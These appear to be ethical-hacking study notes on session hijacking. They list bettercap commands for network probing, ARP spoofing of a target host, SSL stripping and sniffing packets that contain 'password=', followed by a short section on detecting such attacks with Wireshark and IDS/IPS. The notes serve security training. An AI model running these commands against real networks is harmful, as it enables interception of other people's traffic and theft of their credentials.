# 11 Session Hijacking

## Perform
  
### 3 phases:
 - Tracking the Connection
 - Desynchronizing the Connection
 - Injecting the Attacker’s Packet

### Zed Attack Proxy (ZAP)
  Like burpsuite.

### Bettercap (Linux)
``` #bettercap -h ```
- check options

``` #bettercap -iface eth0 ```
- -iface: specifies the interface to bind to (in this example, eth0)
- interactive mode

``` [ip] >> help ```\
in interactive mode of bettercap.\
view the list of available modules of bettercap.
- any.proxy
- api.rest
- arp.spoof
- ble.recon
- caplets
- dhcp6.spoof
- dns.spoof
- events.stream
- gps
- https.proxy
- https.server
- mac.changer
- mysql.server
- net.probe
- net.recon
- net.sniff
- packet.proxy
- syn.scan
- tcp.proxy
- ticker
- ui
- update
- wifi
- wol

``` [ip]>> net.probe on ```\
This module will send different types of probe packets to each IP in the current subnet\
for the net.recon module to detect them.

``` [ip]>> net.recon on ```\
This module is responsible for periodically reading the system ARP table to detect new hosts on the network.

``` [ip]>> set http.proxy.sslstrip true ```\
This module enables SSL stripping.\
SSL stripping: Downgrade from https to http.

``` set arp.spoof.internal true ```\
This module spoofs the local connections among computers of the internal network.

``` set arp.spoof.targets 10.10.10.10 ```\
This module spoofs the IP address of the target host.

``` set net.sniff.regexp ‘.*password=.+’  ```\
This module will only consider the packets sent with a payload matching the given regular expression

## Detect
  ### Methods:
  - Manual: Wireshark or other packet analyzer
  - Automatic: IDS, IPS.
  
  ### Wireshark
  - supported by WinPcap
  - traffic from Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI networks


  
